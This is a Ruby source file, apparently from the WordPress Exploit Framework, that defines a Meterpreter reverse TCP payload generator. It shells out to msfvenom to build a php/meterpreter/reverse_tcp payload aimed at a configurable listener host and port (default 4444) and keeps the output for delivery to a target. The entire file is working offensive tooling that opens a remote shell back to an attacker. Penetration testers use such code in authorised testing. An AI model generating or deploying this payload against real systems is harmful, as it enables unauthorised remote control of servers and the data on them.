require 'open3'

module Wpxf::Payloads
  # A Meterpreter reverse TCP payload generator.
  class MeterpreterReverseTcp < Wpxf::Payload
    include Wpxf
    include Wpxf::Options

    def initialize
      super

      register_options([
        StringOption.new(
          name: 'msfvenom',
          required: true,
          default: 'msfvenom',
          desc: 'The path to the msfvenom executable'
        ),
        StringOption.new(
          name: 'lhost',
          required: true,
          desc: 'The address of the host listening for a connection'
        ),
        PortOption.new(
          name: 'lport',
          required: true,
          default: 4444,
          desc: 'The port being used to listen for incoming connections'
        )
      ])
    end

    def host
      escape_single_quotes(datastore['lhost'])
    end

    def lport
      normalized_option_value('lport')
    end

    def msfvenom
      normalized_option_value('msfvenom')
    end

    def raw
      @meterpreter_payload
    end

    def prepare(mod)
      mod.emit_info 'Generating Meterpreter payload...'
      begin
        stdout, stderr = Open3.capture3(msfvenom, '-p', 'php/meterpreter/reverse_tcp', "LHOST=#{host}", "LPORT=#{lport}")
      rescue Errno::ENOENT => e
        mod.emit_error e.to_s, true
        mod.emit_error 'msfvenom not found - check the msfvenom payload option'
        return false
      end

      if stdout.empty?
        mod.emit_error 'Failed to generate the Meterpreter payload'
        mod.emit_error stderr
        return false
      end

      @meterpreter_payload = stdout
      true
    end
  end
end
